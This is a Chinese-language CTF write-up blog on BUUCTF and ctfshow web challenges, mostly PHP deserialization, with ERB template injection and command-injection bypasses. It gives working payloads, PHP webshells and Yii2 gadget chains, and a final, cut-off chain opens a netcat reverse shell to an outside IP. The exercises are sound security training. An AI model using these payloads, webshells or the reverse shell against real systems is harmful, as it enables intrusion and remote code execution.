\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149395750-95a55a53-b147-4d9c-86e3-e1c4b5782c95.png)\n\n这里有个坑就是在xml文件中一定要包括他本来就存在的`<intro>&xxe;</intro>`这个标签 不然其他标签回显flag不完整都是一般 只有在这个回显的完整的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149481560-7cacba81-1c98-408b-b818-fcafa4800307.png)\n\n# 109、[SCTF2019]Flag Shop\n\n买flag 一眼丁真\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689155122030-02f4658e-9dee-4cad-9574-9990289024e7.png)\n\n就是伪造类似于session之类的去修改自己的钱数 然后再去买flag\n\n但是需要key 抓个包 发现感觉是jwt\n\n然后访问/robots.txt 爆出源码\n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\n这是用ruby写的 虽然不懂语言 但是大致能明白干了个啥\n\n还真是 jwt  看了一下key的生成 `ENV[\"SECRET\"] = SecureRandom.hex(64)`这肯定我们无法伪造 然后就没思路了\n\n看了wp 发现涉及ERB模板注入\n\nERB模板注入格式是`<%=其他%>`\n\n直接来看怎样获取flag\n\n```ruby\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n```\n\n`params[:变量名]`这里应该就是get请求名 虽然不太懂ruby 但是大致能猜出\n\n`params[:name][0,7]`我们输入的name不能超过7个字符\n\n前面说到我们只能输入7个字符的name 除去模板注入的`<%=%>`已经占据了五个字符 我们能控制的只有两个了\n\n这里需要用到Ruby语言的一个特性 我们可以利用`$'`来返回正则匹配结果的右边  \n\n- `$'` 最后一次模式匹配中匹配部分之后的字符串  \n\n比如`hello world `设置匹配e 那么就会返回`llo world`\n\n```ruby\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n```\n\n这里就是在用环境中secret与我们输入的secret进行匹配 如果我们输入secret为空\n\n那么`$'`就会帮我们完整的值输出\n\n所以payload：\n\n```\n/work?SECRET=&name=<%=$'%>&do=<%=$'%> is working\n```\n\n避免歧义进行url编码后打入\n\n```\n/work?SECRET=&name=%3C%25%3D$'%25%3E&do=%3C%25%3D$'%25%3E%20is%20working \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156469993-1fe293bf-0731-4bb9-afa1-1baea4c66837.png)\n\n得到了key 然后jwt伪造 打入抓包 再解码就可以得到flag了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156517393-2b00eb8d-8b8f-483c-bd18-6283d478d58c.png)\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156526111-41289877-d5fe-43b4-995b-8a5c3c2fe4c0.png)\n\n# 110、[GYCTF2020]Easyphp\n\n代码审计先放着 太抽象了 大概看了一下涉及反序列化字符串逃逸 sql注入等等 之后再来填坑把。\n\n# 111、[极客大挑战 2020]Greatphp\n\n```ruby\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n    public function __wakeup(){\n        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){\n           if(!preg_match(\"/\\<\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match)){\n               eval($this->syc);\n           } else {\n               die(\"Try Hard !!\");\n           }\n           \n        }\n    }\n}\n\nif (isset($_GET['great'])){\n    unserialize($_GET['great']);\n} else {\n    highlight_file(__FILE__);\n}\n\n?>\n```\n\n给了源码 那么最重要的就是这个等式成立\n\n```\n($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover))\n```\n\n一般我们可以通过传数组 就可以bypass 但是这道题目是在类中 所以这个方法就不能用了\n\n因此这里用到了新知识点：**md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。**  \n\n所以我们可以通过用含有`__toString`方法的内置类进行绕过，这里用的是Exception 和 Error （随便选一个哪个都可以）\n\n他们有 __toString 方法，当类被当做字符串处理时，就会调用这个函数。  \n\n一个简单的demo来理解 偷的\n\n```ruby\n<?php\n$a = new Error(\"payload\",1);$b = new Error(\"payload\",2);\n\necho $a;\n\necho \"\\r\\n\\r\\n\";\n\necho $b;\n?>\n```\n\n这里我们将类当作字符串进行输出就会调用我们内置类中单`__toString`魔术方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689246050444-e2bd3402-2a56-4bfb-a11a-4fc596dab0f3.png)\n\n所以 `$a!=$b`但是我们输出的内容确是相同的\n\n注意这里我们将`$a = new Error(\"payload\",1);$b = new Error(\"payload\",2);`放在同一行了 因为输出的内容包含我们的行数 所以为了满足条件成立 就要放在同一行\n\n接着看正则将我们单双引号括号都waf了 我们可以include 包含flag文件 然后flag文件可以通过取反的方式绕过\n\nexp:\n\n```ruby\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n}\n$str = \"?><?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?>\";\n$a = new SYCLOVER();\n$a->syc = new Error($str,1);$a->lover = new Error($str,2);#注意要在一行才行\necho urlencode(serialize($a));\n?>\n```\n\npayload:`?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D`\n\n说明：`?><?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?>`为什么要在前面加`?>`\n\nException 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的\n\n因为输出的报错信息中，payload前面还有一段杂乱信息`Error: `\t\n\n就比如我们之前的那个demo\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689247105099-87f2d3e4-1a74-4363-a461-6001c373d7c0.png)\n\n进入eval()函数就会以这样的形式：`eval(\"...Error: <?php payload ?>\")`\n\n所以我们要用sql注入的思想 `?>` 来闭合一下\n\n`eval(\"...Error: ?><?php payload ?>\")`，这样我们的恶意代码就可以顺利执行了。  \n\n参考：[https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/](https://johnfrod.top/ctf/2020-极客大挑战greatphp/)\n\n# 112、EasyBypass\n\n```ruby\n<?php\n\nhighlight_file(__FILE__);\n\n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n\n\nif(preg_match(\"/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is\", $comm1))\n    $comm1 = \"\";\nif(preg_match(\"/\\'|\\\"|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is\", $comm2))\n    $comm2 = \"\";\n\n$flag = \"#flag in /flag\";\n\n$comm1 = '\"' . $comm1 . '\"';\n$comm2 = '\"' . $comm2 . '\"';\n\n$cmd = \"file $comm1 $comm2\";\nsystem($cmd);\n?>\n```\n\n给了源码 comm1没有过滤tac 因此我们就在这里构造\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689248080086-9b602508-dccd-4faa-91e1-1503e8ef5b58.png)\n\n这道题目最重要的就是利用闭合的思想\n\n`$cmd = \"file $comm1 $comm2\";`这句就是我们闭合逃逸的最重要的一句\n\nfile需要一个文件 那么我们就给他的一个index.php然后用\";去闭合\n\n也就是`$cmd = \"file index.php\"; $comm2\";`\n\n再加上我们的恶意代码 构造`index.php\";tac /fla?;\"`\n\n原式就会被我们构造成以下三段\n\n```\n$cmd = \"file index.php\";\ntac /fla?;\n\" $comm2\";\n```\n\n成功bypass\n\npayload：`?comm1=index.php\";tac /fla?;\"&comm2=1`\n","categories":["buuctf"]},{"title":"ctfshow-反序列化","url":"/post/4fb535d6.html","content":"\nctfshow-反序列化\n\n<!--more-->\n\n# WEB-254\n\n就是看懂代码就可以了，和反序列化没关系，让条件成立就给flag了\n\npaylaod:`?username=xxxxxx&password=xxxxxx`\n\n# WEB-255\n\n通过cookie传参反序列化达到`$isVip=true;`即可\n\npoc：\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=true;}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\n然后请求如下：\n\n```php\nGET /?username=xxxxxx&password=xxxxxx HTTP/1.1\nHost: b1e5d003-80d4-4a98-b405-4ce5b5c72282.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nreferer: http://b1e5d003-80d4-4a98-b405-4ce5b5c72282.challenge.ctf.show/\nConnection: close\n```\n\n# WEB-256\n\n在上一题基础上使得username与password不相等 通过反序列化实现即可\n\npoc: 这里最好不要将值设为数字会打不通的\n\n```php\nclass ctfShowUser{\n    public $username='a';\n    public $password='xxxxxx';\n    public $isVip=true;}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\n请求包如下：\n\n```php\nGET /?username=a&password=xxxxxx HTTP/1.1\nHost: d4976ed7-1dae-4590-a624-a16d69c89609.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nConnection: close\n```\n\n# WEB-257\n\n思路：`ctfShowUser类的__destruct()->backDoor的getInfo()`\n\n利用构造函数进行覆盖就行了 \n\npoc如下：\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='a';\n    public $password='xxxxxx';\n    public $isVip=true;\n    private $class;\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n\n}\nclass info{\n    private $user='xxxxxx';\n}\nclass backDoor{\n    private $code='system(\"cat flag.php\");';\n}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\n请求包：\n\n```php\nGET /?username=xxxxxx&password=xxxxxx HTTP/1.1\nHost: 7aa30d0e-43ad-4b97-85fe-c4c15056de6d.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D\nreferer: http://7aa30d0e-43ad-4b97-85fe-c4c15056de6d.challenge.ctf.show/\nConnection: close\n```\n\n\n\n# WEB-258\n\n多了一个正则匹配条件：`!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])`\n\n就是不能存在`o:数字`的形式\n\n因为我们序列化对象后会出现这种情况\n\n所以我只需要在`:`之后加上`+`即可 因为浏览器解析会把我们的加号解析为空格 就可以bypass了\n\npoc和上到题目一样 就是自己手动添加两个`+`即可\n\n```\nO:+11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:1;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:23:\"system(\"cat flag.php\");\";}}\n```\n\n提交的时候再url编码一下不然会出现歧义\n\n# WEB-259(SoapClient)\n\nSoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。  \n\n这道题目本质我看了一下wp 利用SoapClient的__call魔术方法 \n\n因为我们用SoapClient生成的对象不存在`getFlag()`方法，所以就会自动调用__call魔术方法\n\n```\n__call($func,$args)\n```\n\n默认$func为不存在函数名 $args为参数 并且以数组形式  \n\n这道题目最大问题就是没法直接通过访问/flag修改其xff为127.0.0.1来达到条件\n\n所以就需要这个内置类配合crlf来模拟一个请求包 来达到将flag存入flag.txt的条件\n\n我的理解是这样\n\n参考:https://www.xiinnn.com/article/7741c455.html 讲的很仔细\n\npoc(偷的人家的):\n\n```php\n<?php\n$ua = \"Lxxx\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow\";\n$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));\n\nprint_r(urlencode(serialize($client)));\n```\n\n传入payload 然后访问/flag.txt即可\n\npayload:`?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`\n\n# WEB-260\n\n`?ctfshow=ctfshow_i_love_36D`没啥可说的\n\n# WEB-261\n\n这道题目需要明白两个点 虽然这道题用不到\n\n-  __serialize() 和 __sleep()都存在则只会调用 __serialize()不会调用__sleep()\n- __unserialize()和__wake()都存在则只会调用__unserialize()不会调用__wake()\n\n__invoke是个迷惑项\n\n最关键的是这个`$this->code==0x36d`弱相等 所以`877.php=877`\n\npoc：\n\n```php\n<?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n}\n$a = new ctfshowvip();\n$a->username = '877.php';\n$a->password ='<?php @eval($_POST[x]);?>';\necho urlencode(serialize($a))\n?>\n```\n\n# WEB-262，264(反序列化字符串逃逸)\n\n看到有序列化后字符替换 一眼丁真就是字符串逃逸\n\n这道题目其实会将我们提交的内容先序列化然后再反序列化\n\n简单demo看懂\n\n```php\n<?php\nclass message{\n    public $from=1;\n    public $msg=1;\n    public $to='fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}';# \n    public $token='user';\n}\n$a = new message();\n$b = serialize($a);\necho $b;\necho \"\\n\";\n#echo $c;\nprint_r(unserialize(str_replace('fuck', 'loveU', $b)))\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688540178216-b4b80ad8-03f9-4c4e-a980-5e28ab85395e.png)\n\npayload:`?f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D`\t\n\n然后将cookie保存下来 访问/message 打入cookie即可获得flag\n\n# WEB-263(phpsession序列化)\n\n访问/www.zip源码泄露\n\n这道题目一开始最大的疑惑是是我们提交上去的序列化内容在哪反序列化的\n\n网上wp千篇一律没人提及\n\n最后我也没弄明白 感觉只有这个session引擎会 所以我也就这么理解了\n\n先来看：`ini_set('session.serialize_handler', 'php');`参考：https://blog.spoock.com/2016/10/16/php-serialize-problem/\n\nsession.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。  \n\n- php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n然后简单的逻辑就是我们可以通过控制session去序列化\n\n在inc.php有\n\n```php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\n他的析构函数就是我们的插入点\n\n因为这个题目是默认的引擎 所以session是用`|`来分割键值 值为serialize()处理的结果\n\npoc如下：\n\n```php\n<?php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n$a = new User();\n$a->username = '1.php';\n$a->password = '<?php @eval($_POST[x]);?>';\necho base64_encode('|'.serialize($a))\n#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==\n?>\n```\n\n访问index.php cookie[limit]打入 再访问check.php \n\n然后访问我们的木马文件 log-1.php\n\nrce即可\n\n# WEB-265(取地址符)\n\n这道题目一开始看 发现这个随机数函数绕过不去 看了wp 师傅们太强了 \n\n用了`&`取地址 `$a=&$b`则当b值变 a也跟着变\n\npoc:\n\n```php\n<?php\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n    public function __construct(){\n        $this->token='a';\n        $this->password =&$this->token;\n}}\n$a=new ctfshowAdmin();\necho urlencode(serialize($a));\n#O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D\n?>\n```\n\n# WEB-266\n\n这道题目大写绕个正则即可 \n\n```php\nGET / HTTP/1.1\nHost: 0df5fa90-8128-463c-b40b-12ed31c48ad8.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 18\n\nO:7:\"Ctfshow\":0:{}\n```\n\n\n\n# WEB-267(Yii2反序列化链)\n\nyii2是php的一个框架 直接在网上找现成的链子poc即可\n\n首先通过弱口令 admin/admin登录 然后查看about \n\n提示访问`?r=site%2Fabout&view-source`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688552009392-f89d43dd-2251-4780-864b-91c362be0e92.png)\n\n然后这里查看源码可以发现yii2这个信息 因为是反序列化模块嘛直接去找链子即可\n\n这道题找到的poc只能用passthru函数 其他函数都用不了 挺奇怪的\n\npoc如下： 参考：https://www.anquanke.com/post/id/254429 这里的链子哪个不行换就行了\n\n```php\n<?php\n\nnamespace yii\\rest {\n    class CreateAction {\n        public $id;\n        public $checkAccess;\n        public function __construct() {\n            $this->id = 'cat /flag';\n            $this->checkAccess = 'passthru';\n        }\n    }\n}\n\nnamespace Faker {\n    use yii\\rest\\CreateAction;\n    class Generator {\n        protected $formatters;\n        public function __construct() {\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db {\n    use Faker\\Generator;\n    class BatchQueryResult {\n        private $_dataReader;\n        public function __construct() {\n            $this->_dataReader = new Generator();\n        }\n    }\n}\n\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n?>\n```\n\npaylaod:\n\n```\n?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoyOiJpZCI7czo5OiJjYXQgL2ZsYWciO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjg6InBhc3N0aHJ1Ijt9aToxO3M6MzoicnVuIjt9fX19\n```\n\n# WEB-268（Yii2反序列化链）\n\n前面的链子不行了 换一个就行了\n\n```php\n<?php\n\nnamespace yii\\rest {\n    class CreateAction {\n        public $checkAccess;\n        public $id;\n        public function __construct() {\n            $this->checkAccess=\"passthru\";\n            $this->id=\"cat /flags\";\n        }\n    }\n}\n\nnamespace Faker {\n    use yii\\rest\\CreateAction;\n    class Generator {\n        protected $formatters;\n        public function __construct() {\n            $this->formatters['isRunning'] = [new CreateAction(), 'run'];\n        }\n\n    }\n}\n\nnamespace Codeception\\Extension {\n    use Faker\\Generator;\n    class RunProcess {\n        private $processes;\n        public function __construct() {\n            $this->processes = [new Generator()];\n        }\n    }\n}\n\nnamespace {\n    use Codeception\\Extension\\RunProcess;\n    echo base64_encode(serialize(new RunProcess()));\n}\n?>\n```\n\n# WEB-269(Yii2反序列化链)\n\n继续换：\n\n```php\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'cat /flagsa';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为isRunning\n            $this->formatters['render'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n\n    use Faker\\Generator;\n\n    class See{\n        protected $description;\n        public function __construct()\n        {\n            $this->description = new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys = [];\n        private $path;\n        public function __construct()\n        {\n            $this->path = new See;\n            $this->keys = array(\n                \"axin\"=>array(\"is\"=>\"handsome\")\n            );\n        }\n    }\n    // 生成poc\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n```\n\n# WEB-270(Yii2反序列化链)\n\n这次用反弹shell\n\n```php\n<?php\nnamespace yii\\rest {\n    class Action\n    {\n        public $checkAccess;\n    }\n    class IndexAction\n    {\n        public function __construct($func, $param)\n        {\n            $this->checkAccess = $func;\n            $this->id = $param;\n        }\n    }\n}\nnamespace yii\\web {\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct($func, $param)\n        {\n            $this->writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct($func, $param)\n        {\n            $this->_dataReader = new \\yii\\web\\DbSession($func, $param);\n        }\n    }\n}\nnamespace {\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', 'nc 8.130.34.53 7777 -e /bin/sh');\n    